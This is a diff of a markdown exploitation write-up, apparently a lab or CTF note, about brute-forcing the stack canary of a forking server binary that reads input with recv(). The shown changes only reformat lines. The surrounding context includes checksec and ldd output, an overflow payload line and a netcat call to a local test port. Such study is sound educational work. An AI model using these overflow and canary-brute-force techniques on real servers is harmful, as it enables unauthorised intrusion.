@@ -1,6 +1,6 @@
 # Server Fork with recv() - vuln1
 
-fork without execve() child process = canary does not change
+fork without execve() child process = canary does not change </br>
 recv() = no null terminator '\x00' which makes canary bruteforce possible
 ```
 gef➤  checksec
@@ -24,7 +24,9 @@ Done.
 stripped = no symbol table, so no 'b main', use starti then set break point with ghidra reference
 ```
 # file vuln1 
-vuln1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f, stripped
+vuln1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter 
+/lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f,
+ stripped
 
 # ldd vuln1 
 	linux-vdso.so.1 (0x00007ffc2df84000)
@@ -57,7 +59,7 @@ payload = b'a' * 0x34 + b'cccc'
 netcat( '127.0.0.1', 1337 , payload , i  , []  )
 ```
 
-After sending payload: (Canary = 0xfc16151f1fa28700 )
+After sending payload:  (  Canary = 0xfc16151f1fa28700 ) </br>
 RBP address highlighted
 ![Image description](stack1.JPG)
 
